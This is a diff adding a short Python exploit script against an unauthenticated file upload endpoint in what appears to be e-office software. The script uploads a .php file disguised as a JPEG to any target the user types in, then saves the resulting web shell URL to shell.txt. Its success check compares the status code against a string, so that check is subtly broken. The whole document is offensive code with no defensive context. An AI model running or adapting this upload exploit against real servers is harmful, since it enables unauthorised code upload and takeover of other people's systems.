@@ -1,0 +1,25 @@
+import requests
+
+def run(target):
+    url = f"{target}/general/index/UploadFile.php?m=uploadPicture&uploadType=eoffice_logo&userId="
+    headers = {"Cache-Control": "max-age=0",
+               "Upgrade-Insecure-Requests": "1",
+               "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36",
+               "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", 
+               "Accept-Encoding": "gzip, deflate", 
+               "Accept-Language": "zh-CN,zh;q=0.9", 
+               "Connection": "close", 
+               "Content-Type": "multipart/form-data; boundary=e64bdf16c554bbc109cecef6451c26a4"}
+    data = "--e64bdf16c554bbc109cecef6451c26a4\r\nContent-Disposition: form-data; name=\"Filedata\"; filename=\"test.php\"\r\nContent-Type: image/jpeg\r\n\r\n1\r\n\r\n--e64bdf16c554bbc109cecef6451c26a4--\r\n"
+    res = requests.post(url, headers=headers,data=data)
+    if res.status_code == "200" and "logo-eoffice.php" in res.text:
+        print(f"上传成功，请访问 {target}/images/logo/logo-eoffice.php")
+        with open("shell.txt","w")as w:
+            w.write(f"{target}/images/logo/logo-eoffice.php")
+        return True
+    
+    return False
+            
+if __name__ == "__main__":
+    target = input("Target：")
+    run(target)
